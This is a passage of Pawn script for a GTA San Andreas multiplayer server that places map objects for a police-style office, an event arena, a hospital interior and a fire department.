	CreateDynamicObject(1806,310.13595581,-1471.40625000,-34.52923965,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(med_office_chair) (9)
	CreateDynamicObject(1806,308.49731445,-1471.39831543,-34.52923965,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(med_office_chair) (10)
	CreateDynamicObject(1806,306.94650269,-1471.37988281,-34.52923965,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(med_office_chair) (11)
	CreateDynamicObject(1806,305.62155151,-1473.00012207,-34.52923965,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(med_office_chair) (12)
	CreateDynamicObject(1806,311.44116211,-1472.99316406,-34.52923965,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(med_office_chair) (13)
	CreateDynamicObject(16782,322.13433838,-1469.29296875,-32.56002808,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(a51_radar_scan) (1)
	CreateDynamicObject(2611,325.91857910,-1473.77783203,-32.58835220,0.00000000,0.00000000,179.93066406, .interiorid = 1); //object(police_nb1) (1)
	CreateDynamicObject(14527,304.30047607,-1480.94714355,-26.86861801,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(fannyfan) (1)
	CreateDynamicObject(2198,289.17578125,-1474.82629395,-34.53079605,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(med_office2_desk_3) (1)
	CreateDynamicObject(1714,290.23767090,-1474.06457520,-34.53079605,0.00000000,0.00000000,300.22509766, .interiorid = 1); //object(kb_swivelchair1) (4)
	CreateDynamicObject(2182,292.43322754,-1475.33679199,-34.53079605,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(med_office5_desk_1) (1)
	CreateDynamicObject(2000,285.47576904,-1472.12133789,-34.53079605,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(filing_cab_nu) (1)
	CreateDynamicObject(2000,285.47576904,-1472.64123535,-34.53079605,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(filing_cab_nu) (2)
	CreateDynamicObject(14632,321.33325195,-1475.83569336,-33.03472900,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(paperchase_bits2b) (1)
	CreateDynamicObject(2186,329.36141968,-1464.33728027,-34.52298355,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(photocopier_1) (1)
	CreateDynamicObject(2206,329.35076904,-1471.45605469,-34.52298355,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(med_office8_desk_02) (1)
	CreateDynamicObject(2606,329.50375366,-1472.36730957,-33.36120224,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_police_counter2) (1)
	CreateDynamicObject(2612,304.02514648,-1463.07299805,-32.50022888,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(police_nb2) (1)
	CreateDynamicObject(2611,314.25363159,-1463.07299805,-32.39287949,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(police_nb1) (2)
	CreateDynamicObject(1722,323.52783203,-1485.03967285,-34.52298355,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(off_chairnu) (1)
	CreateDynamicObject(1722,322.35116577,-1485.02929688,-34.52298355,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(off_chairnu) (2)
	CreateDynamicObject(1722,321.10070801,-1485.05798340,-34.52298355,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(off_chairnu) (3)
	CreateDynamicObject(1722,325.25961304,-1481.93444824,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(off_chairnu) (4)
	CreateDynamicObject(1722,325.27322388,-1480.63781738,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(off_chairnu) (5)
	CreateDynamicObject(1722,325.24453735,-1479.48413086,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(off_chairnu) (6)
	CreateDynamicObject(1808,317.90686035,-1482.45349121,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_watercooler2) (1)
	CreateDynamicObject(15038,325.23391724,-1478.51025391,-33.90579605,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(plant_pot_3_sv) (1)
	CreateDynamicObject(1616,317.07241821,-1498.25427246,-37.11650085,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(nt_securecam1_01) (1)
	CreateDynamicObject(1616,281.14285278,-1481.05761719,-31.00306702,0.00000000,0.00000000,267.23352051, .interiorid = 1); //object(nt_securecam1_01) (2)
	CreateDynamicObject(1616,318.01690674,-1485.05334473,-31.00306702,0.00000000,0.00000000,267.23144531, .interiorid = 1); //object(nt_securecam1_01) (3)
	CreateDynamicObject(1616,277.92636108,-1509.63354492,-43.22993469,0.00000000,0.00000000,267.23144531, .interiorid = 1); //object(nt_securecam1_01) (4)



	// Emir Map TDM EVENT ETKÝNLÝK ETKINLIK MAP BORU BORULU
	CreateDynamicObject(7191, 2254.3999, -2705.3999, 14.5, 0, 0, 270);
	CreateDynamicObject(7191, 2209.69995, -2705.3999, 14.5, 0, 0, 270);
	CreateDynamicObject(7191, 2164.69995, -2705.3999, 14.5, 0, 0, 270);
	CreateDynamicObject(7191, 2120.6001, -2705.3999, 14.5, 0, 0, 270);
	CreateDynamicObject(8229, 2276.30005, -2694.3999, 15.2, 0, 0, 269.75);
	CreateDynamicObject(8229, 2276.3999, -2682.30005, 15.2, 0, 0, 89.747);
	CreateDynamicObject(997, 2225.3999, -1699, 12.8, 0, 0, 0);
	CreateDynamicObject(997, 2223.6001, -1701.59998, 12.8, 0, 0, 54);
	CreateDynamicObject(997, 2223.30005, -1704.69995, 12.8, 0, 0, 82.498);
	CreateDynamicObject(997, 2222.8999, -1707.80005, 12.8, 0, 0, 82.496);
	CreateDynamicObject(997, 2222.5, -1710.90002, 12.8, 0, 0, 82.496);
	CreateDynamicObject(997, 2222.1001, -1714, 12.8, 0, 0, 82.496);
	CreateDynamicObject(997, 2221.69995, -1717.09998, 12.8, 0, 0, 82.496);
	CreateDynamicObject(997, 2221.30005, -1720.19995, 12.8, 0, 0, 82.496);
	CreateDynamicObject(997, 2221.30005, -1723.30005, 12.8, 0, 0, 89.996);
	CreateDynamicObject(997, 2223, -1726, 12.8, 0, 0, 121.995);
	CreateDynamicObject(997, 2225.8999, -1727.30005, 12.8, 0, 0, 155.992);
	CreateDynamicObject(997, 2229, -1727.59998, 12.8, 0, 0, 174.739);
	CreateDynamicObject(997, 2232.1001, -1727.5, 12.8, 0, 0, 180.488);
	CreateDynamicObject(997, 2235.19995, -1727.5, 12.8, 0, 0, 180.483);
	CreateDynamicObject(997, 2238.30005, -1727.40002, 12.8, 0, 0, 180.483);
	CreateDynamicObject(997, 2241.5, -1727.30005, 12.8, 0, 0, 180.483);
	CreateDynamicObject(997, 2241.69995, -1724.09998, 12.8, 0, 0, 266.483);
	CreateDynamicObject(997, 2241.8999, -1721, 12.8, 0, 0, 266.479);
	CreateDynamicObject(8375, 2287.80005, -1706.19995, 14.6, 0, 0, 359.5);
	CreateDynamicObject(984, 2287.30005, -1721.5, 17.2, 0, 0, 90.5);
	CreateDynamicObject(984, 2274.5, -1721.5, 17.2, 0, 0, 90.25);
	CreateDynamicObject(984, 2261.69995, -1721.5, 17.2, 0, 0, 90.247);
	CreateDynamicObject(984, 2248.8999, -1721.5, 17.2, 0, 0, 90.247);
	CreateDynamicObject(982, 2263.8999, -1701.40002, 17.3, 0, 0, 270);
	CreateDynamicObject(3881, 2280.8999, -1698.69995, 18.4, 0, 0, 90.25);
	CreateDynamicObject(984, 2287.30005, -1696, 17.2, 0, 0, 90.5);
	CreateDynamicObject(983, 2293.69995, -1718.30005, 17.3, 0, 0, 0);
	CreateDynamicObject(983, 2305.19995, -1695.80005, 13, 0, 0, 0);
	CreateDynamicObject(3887, -279.79999, 2171.69995, 112.4, 0, 0, 258);
	CreateDynamicObject(3887, -242.5, 2292, 110.2, 0, 0, 81.997);
	CreateDynamicObject(3865, -301.70001, 2178.30005, 112.6, 0, 0, 354.25);
	CreateDynamicObject(3865, -300.70001, 2187.3999, 112.6, 0, 0, 354.499);
	CreateDynamicObject(3865, -299.70001, 2196.5, 112.6, 0, 0, 354.496);
	CreateDynamicObject(3865, -298.70001, 2205.69995, 112.6, 0, 0, 354.496);
	CreateDynamicObject(3865, -297.70001, 2214.80005, 112.6, 0, 0, 354.496);
	CreateDynamicObject(3865, -296.70001, 2224, 112.6, 0, 0, 354.496);
	CreateDynamicObject(3865, -295.70001, 2233.1001, 112.6, 0, 0, 354.496);
	CreateDynamicObject(3865, -294.79999, 2242, 112.6, 0, 0, 354.496);
	CreateDynamicObject(3865, -293.79999, 2251.19995, 112.6, 0, 0, 354.496);
	CreateDynamicObject(3865, -292.89999, 2260, 112.6, 0, 0, 354.496);
	CreateDynamicObject(3865, -292, 2268.1001, 112.6, 0, 0, 354.496);
	CreateDynamicObject(3865, -291.10001, 2276.80005, 112.6, 0, 0, 354.496);
	CreateDynamicObject(3865, -290.10001, 2285.80005, 112.6, 0, 0, 354.496);
	CreateDynamicObject(3865, -289.10001, 2294.80005, 112.6, 0, 0, 354.996);
	CreateDynamicObject(3865, -288.20001, 2303.80005, 112.6, 0, 0, 354.996);
	CreateDynamicObject(3865, -287.29999, 2312.8999, 112.6, 0, 0, 354.996);
	CreateDynamicObject(3865, -286.39999, 2322.1001, 111.8, 350, 0, 354.996);
	CreateDynamicObject(16303, -291.20001, 2158.19995, 106.6, 0, 350, 96);
	CreateDynamicObject(16303, -277.70001, 2154.19995, 104.2, 0, 349.997, 95.999);
	CreateDynamicObject(16303, -261.20001, 2151.6001, 104.4, 0, 349.997, 95.999);
	CreateDynamicObject(3865, -255, 2178.19995, 117.4, 0, 0, 350.249);
	CreateDynamicObject(3865, -253.3, 2187.19995, 117.4, 0, 0, 350.244);
	CreateDynamicObject(3865, -251.89999, 2194.80005, 117.4, 0, 0, 350.244);
	CreateDynamicObject(3865, -250.3, 2203.6001, 117.4, 0, 0, 350.244);
	CreateDynamicObject(3865, -248.7, 2212.5, 117.4, 0, 0, 350.244);
	CreateDynamicObject(3865, -247.3, 2220.30005, 117.4, 0, 0, 350.244);
	CreateDynamicObject(3865, -245.60001, 2229.30005, 117.4, 0, 0, 350.244);
	CreateDynamicObject(3865, -244.10001, 2237.5, 117.4, 0, 0, 350.244);
	CreateDynamicObject(3865, -242.39999, 2246.6001, 117.4, 0, 0, 350.244);
	CreateDynamicObject(3865, -240.7, 2255.3999, 117.4, 0, 0, 350.244);
	CreateDynamicObject(3865, -239, 2264.6001, 117.4, 0, 0, 350.244);
	CreateDynamicObject(3865, -237.39999, 2273.5, 116.6, 350, 0, 350.244);
	CreateDynamicObject(3865, -236.3, 2282.1001, 115.3, 355, 0, 352.739);
	CreateDynamicObject(16303, -227.5, 2305.80005, 104, 0, 349.997, 271.999);
	CreateDynamicObject(16303, -245, 2308.8999, 102.1, 0, 349.991, 271.994);
	CreateDynamicObject(16303, -258, 2310.69995, 102.1, 0, 349.991, 271.994);

	// Hospital Interior
	CreateDynamicObject(18030, 1174.7900390625, -1343.57421875, 2424.4133300781, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(14466, 1214.5484619141, -1360.7130126953, 2432.2053222656, 0, 0, 270.5, .interiorid = 1);
	CreateDynamicObject(7191, 1191.828125, -1351.0107421875, 2421.6208496094, 0, 270, 0, .interiorid = 1);
	CreateDynamicObject(14782, 1187.7976074219, -1353.7375488281, 2423.0622558594, 0, 0, 90.5, .interiorid = 1);
	CreateDynamicObject(1523, 1190.55078125, -1350.01953125, 2422.2648925781, 0, 0, 180.24719238281, .interiorid = 1);
	CreateDynamicObject(18070, 1169.6414794922, -1345.1927490234, 2422.5458984375, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(4724, 1158.5886230469, -1353.6053466797, 2423.7512207031, 0, 0, 0.25, .interiorid = 1);
	CreateDynamicObject(2001, 1163.2530517578, -1355.927734375, 2422.0461425781, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(932, 1185.4672851563, -1355.8714599609, 2422.0461425781, 0, 0, 272.5, .interiorid = 1);
	CreateDynamicObject(932, 1183.7150878906, -1355.9479980469, 2422.0461425781, 0, 0, 272.49938964844, .interiorid = 1);
	CreateDynamicObject(932, 1182.11328125, -1355.9810791016, 2422.0461425781, 0, 0, 272.49938964844, .interiorid = 1);
	CreateDynamicObject(932, 1180.4866943359, -1355.9487304688, 2422.0461425781, 0, 0, 272.49938964844, .interiorid = 1);
	CreateDynamicObject(1557, 1168.1516113281, -1357.0413818359, 2422.0461425781, 0, 0, 359.5, .interiorid = 1);
	CreateDynamicObject(1557, 1171.1590576172, -1357.0489501953, 2422.0461425781, 0, 0, 180, .interiorid = 1);
	CreateDynamicObject(2596, 1156.7939453125, -1348.4765625, 2425.3452148438, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2596, 1163.4686279297, -1354.6719970703, 2425.3083496094, 0, 0, 270.25, .interiorid = 1);
	CreateDynamicObject(2773, 1185.4097900391, -1354.6234130859, 2422.5634765625, 0, 0, 90.25, .interiorid = 1);
	CreateDynamicObject(2773, 1183.4921875, -1354.6352539063, 2422.5634765625, 0, 0, 90.247192382813, .interiorid = 1);
	CreateDynamicObject(2773, 1181.576171875, -1354.6499023438, 2422.5634765625, 0, 0, 90.247192382813, .interiorid = 1);
	CreateDynamicObject(2190, 1168.4984130859, -1346.9685058594, 2423.0561523438, 0, 0.25, 182.75, .interiorid = 1);
	CreateDynamicObject(2190, 1170.7844238281, -1346.9844970703, 2423.0561523438, 0, 0.2471923828125, 182.74658203125, .interiorid = 1);
	CreateDynamicObject(1663, 1170.712890625, -1345.3366699219, 2422.5063476563, 0, 0, 17.25, .interiorid = 1);
	CreateDynamicObject(1663, 1168.3572998047, -1345.3454589844, 2422.5063476563, 0, 0, 355.99853515625, .interiorid = 1);
	CreateDynamicObject(2894, 1169.7390136719, -1347.2918701172, 2423.0561523438, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(7930, 1189.5693359375, -1345.9460449219, 2423.5441894531, 90, 180.0054931640600549316406, 269.98352050781, .interiorid = 1);
	CreateDynamicObject(3962, 1156.3192138672, -1357.0517578125, 2424.2602539063, 0, 0, 268.5, .interiorid = 1);
	CreateDynamicObject(2257, 1152.9465332031, -1351.5755615234, 2424.3505859375, 0, 180, 89.999969482422, .interiorid = 1);
	CreateDynamicObject(2243, 1166.4963378906, -1348.0822753906, 2422.3195800781, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2243, 1172.7916259766, -1347.9880371094, 2422.3195800781, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2954, 1190.2352294922, -1346.0294189453, 2422.0461425781, 0, 0, 270.5, .interiorid = 1);
	CreateDynamicObject(1726, 1155.638671875, -1348.72265625, 2422.0461425781, 0, 0, 0.25, .interiorid = 1);
	CreateDynamicObject(1726, 1153.4948730469, -1352.5561523438, 2422.0461425781, 0, 0, 89.997192382813, .interiorid = 1);
	CreateDynamicObject(1726, 1157.3165283203, -1355.7957763672, 2422.0461425781, 0, 0, 179.99450683594, .interiorid = 1);
	CreateDynamicObject(1727, 1154.0897216797, -1354.7977294922, 2422.0461425781, 0, 0, 123, .interiorid = 1);
	CreateDynamicObject(1727, 1153.9633789063, -1349.6390380859, 2422.0461425781, 0, 0, 44.997436523438, .interiorid = 1);
	CreateDynamicObject(1727, 1162.5498046875, -1354.5593261719, 2422.0461425781, 0, 0, 220.99743652344, .interiorid = 1);
	CreateDynamicObject(7191, 1157.6741943359, -1339.1177978516, 2424.0207519531, 0, 0, 270, .interiorid = 1);
	CreateDynamicObject(7191, 1157.6701660156, -1338.3753662109, 2424.0207519531, 0, 0, 270, .interiorid = 1);
	CreateDynamicObject(1776, 1153.2979736328, -1343.3521728516, 2423.1455078125, 0, 0, 90.75, .interiorid = 1);
	CreateDynamicObject(1209, 1153.2958984375, -1346.2855224609, 2422.0461425781, 0, 0, 90.5, .interiorid = 1);
	CreateDynamicObject(7191, 1167.7000732422, -1313.4320068359, 2427.9807128906, 0, 0, 180, .interiorid = 1);
	CreateDynamicObject(7191, 1191.1739501953, -1335.5490722656, 2424.0207519531, 0, 0, 90, .interiorid = 1);
	CreateDynamicObject(7191, 1167.69921875, -1313.431640625, 2424.0207519531, 0, 0, 179.99450683594, .interiorid = 1);
	CreateDynamicObject(7191, 1191.173828125, -1335.548828125, 2427.9807128906, 0, 0, 90, .interiorid = 1);
	CreateDynamicObject(2603, 1154.3084716797, -1331.0260009766, 2422.4995117188, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2603, 1157.8651123047, -1331.033203125, 2422.4995117188, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2603, 1162.1901855469, -1330.9475097656, 2422.4995117188, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2603, 1165.8120117188, -1330.8693847656, 2422.4995117188, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2596, 1156.2908935547, -1337.9664306641, 2424.7763671875, 0, 0, 179.25, .interiorid = 1);
	CreateDynamicObject(2596, 1163.3677978516, -1337.9395751953, 2424.7763671875, 0, 0, 179.24743652344, .interiorid = 1);
	CreateDynamicObject(3383, 1175.9519042969, -1330.5677490234, 2422.0461425781, 0, 0, 179.75, .interiorid = 1);
	CreateDynamicObject(3383, 1183.3975830078, -1330.3992919922, 2422.0461425781, 0, 0, 179.74731445313, .interiorid = 1);
	CreateDynamicObject(3388, 1172.5631103516, -1329.8569335938, 2422.0461425781, 0, 0, 90.25, .interiorid = 1);
	CreateDynamicObject(3388, 1180.3153076172, -1329.8544921875, 2422.0461425781, 0, 0, 90.247192382813, .interiorid = 1);
	CreateDynamicObject(3394, 1184.6655273438, -1334.9022216797, 2422.0461425781, 0, 0, 269.75, .interiorid = 1);
	CreateDynamicObject(3394, 1175.7877197266, -1334.8275146484, 2422.0461425781, 0, 0, 269.74731445313, .interiorid = 1);

	// Fire Department
	CreateDynamicObject(14853, 233.17, 151.00, 2002.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(14855, 199.40, 146.71, 2000.94,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(8133, 222.43, 152.07, 2022.76,   90.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(14858, 213.01, 151.55, 2002.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(8133, 172.93, 150.34, 1997.00,   0.00, 90.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2206, 189.63, 132.41, 1996.78,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2206, 184.74, 132.63, 1996.84,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2737, 189.22, 135.20, 1999.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(1663, 188.62, 130.16, 1997.31,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1663, 189.68, 130.87, 1997.31,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1663, 187.74, 130.89, 1997.31,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1663, 184.92, 131.06, 1997.31,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1663, 183.72, 130.35, 1997.31,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1663, 182.57, 131.09, 1997.31,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1671, 188.75, 133.92, 1997.30,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(1671, 183.78, 133.49, 1997.30,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(16378, 178.77, 133.37, 1997.58,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(1721, 178.29, 132.04, 1997.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(1721, 176.43, 132.10, 1997.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2161, 175.98, 128.29, 1996.90,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2161, 175.98, 129.59, 1996.90,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2163, 181.20, 127.73, 1996.88,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2163, 181.20, 127.73, 1997.78,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(14455, 191.37, 128.10, 1998.53,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2002, 186.88, 135.02, 1997.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2002, 181.72, 134.96, 1997.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(644, 190.81, 134.36, 1997.00,   0.00, 0.00, 104.00, .interiorid = 73);
	CreateDynamicObject(2240, 185.72, 127.87, 1997.26,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(14782, 189.27, 167.67, 1997.86,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(14782, 192.03, 167.76, 1997.86,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(14401, 179.46, 171.55, 1997.00,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(14401, 185.46, 171.59, 1997.00,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(14401, 202.21, 176.02, 1997.00,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(14401, 197.28, 176.04, 1997.00,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(14401, 191.47, 176.12, 1997.00,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(14401, 195.93, 175.97, 1997.00,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(366, 189.03, 171.99, 1997.95,   0.00, 40.00, 0.00, .interiorid = 73);
	CreateDynamicObject(14397, 204.39, 172.34, 1996.37,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(366, 189.59, 172.00, 1997.95,   0.00, 40.00, 0.00, .interiorid = 73);
	CreateDynamicObject(366, 190.07, 172.02, 1997.95,   0.00, 40.00, 0.00, .interiorid = 73);
	CreateDynamicObject(366, 190.51, 172.01, 1997.95,   0.00, 40.00, 0.00, .interiorid = 73);
	CreateDynamicObject(366, 191.01, 172.03, 1997.95,   0.00, 40.00, 0.00, .interiorid = 73);
	CreateDynamicObject(366, 191.45, 172.01, 1997.95,   0.00, 40.00, 0.00, .interiorid = 73);
	CreateDynamicObject(366, 192.19, 172.26, 1997.94,   0.00, 40.00, 236.00, .interiorid = 73);
	CreateDynamicObject(2395, 193.89, 162.71, 1996.87,   0.00, 0.00, 309.00, .interiorid = 73);
	CreateDynamicObject(2395, 193.90, 162.70, 1999.58,   0.00, 0.00, 309.00, .interiorid = 73);
	CreateDynamicObject(1523, 193.71, 163.13, 1996.83,   0.00, 0.00, 129.00, .interiorid = 73);
	CreateDynamicObject(2395, 192.61, 164.30, 2002.55,   0.00, 90.00, 309.00, .interiorid = 73);
	CreateDynamicObject(2395, 195.92, 160.21, 2000.08,   0.00, 90.00, 309.00, .interiorid = 73);
	CreateDynamicObject(2395, 193.89, 162.71, 1996.87,   0.00, 180.00, 309.00, .interiorid = 73);
	CreateDynamicObject(2395, 195.81, 160.69, 1999.58,   0.00, 0.00, 129.00, .interiorid = 73);
	CreateDynamicObject(2395, 195.81, 160.69, 1996.87,   0.00, 0.00, 129.00, .interiorid = 73);
	CreateDynamicObject(2395, 197.83, 158.17, 2000.08,   0.00, 90.00, 129.00, .interiorid = 73);
	CreateDynamicObject(2395, 194.50, 162.28, 2002.55,   0.00, 90.00, 129.00, .interiorid = 73);
	CreateDynamicObject(2198, 187.40, 148.76, 1996.80,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2198, 188.44, 149.81, 1996.80,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2198, 189.37, 148.76, 1996.80,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2198, 186.49, 149.80, 1996.80,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2356, 187.91, 147.53, 1996.85,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2356, 187.76, 150.76, 1996.85,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2356, 190.04, 149.26, 1996.85,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2356, 185.33, 149.21, 1996.85,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2198, 180.87, 147.97, 1997.00,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2198, 179.89, 149.01, 1997.00,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2198, 179.86, 147.06, 1997.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2198, 180.88, 149.94, 1997.00,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2356, 180.23, 151.13, 1996.85,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2356, 180.45, 145.81, 1996.85,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2356, 181.97, 148.37, 1996.85,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2356, 178.87, 148.29, 1996.85,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2202, 184.09, 159.46, 1996.85,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2202, 178.75, 159.42, 1996.80,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2197, 190.60, 159.55, 1996.80,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2197, 190.62, 158.86, 1996.80,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2197, 190.62, 158.19, 1996.80,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2197, 190.63, 157.51, 1996.81,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2191, 191.16, 156.67, 1996.73,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2198, 183.86, 153.59, 1997.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2198, 184.94, 154.59, 1996.80,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2198, 185.87, 153.57, 1996.80,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2198, 182.97, 154.58, 1996.80,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2356, 182.00, 154.01, 1996.85,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2356, 184.37, 152.52, 1996.85,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2356, 186.76, 154.00, 1996.85,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2356, 184.40, 155.67, 1996.85,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2204, 191.66, 145.73, 1996.80,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2001, 191.50, 154.56, 1996.82,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2001, 191.50, 151.45, 1996.82,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2001, 191.55, 147.75, 1996.82,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2266, 184.69, 143.75, 1998.76,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2258, 177.72, 154.14, 1999.00,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(638, 172.83, 157.38, 1997.53,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(638, 172.78, 144.98, 1997.53,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2013, 199.64, 164.01, 1996.70,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2014, 199.64, 162.03, 1996.70,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2014, 199.63, 165.00, 1996.70,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2017, 199.62, 166.01, 1996.71,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2016, 199.62, 167.00, 1996.71,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2015, 199.65, 161.04, 1996.70,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1786, 195.53, 167.94, 1997.33,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2314, 194.92, 167.69, 1996.86,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(1769, 196.16, 165.31, 1996.59,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1769, 197.60, 166.14, 1996.59,   0.00, 0.00, 222.00, .interiorid = 73);
	CreateDynamicObject(1769, 193.80, 165.91, 1996.59,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(1594, 197.53, 161.01, 1997.28,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(1594, 195.60, 162.44, 1997.28,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2748, 201.20, 122.87, 1997.24,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1775, 198.92, 122.92, 1997.93,   0.00, 0.00, 180.00, .interiorid = 73);
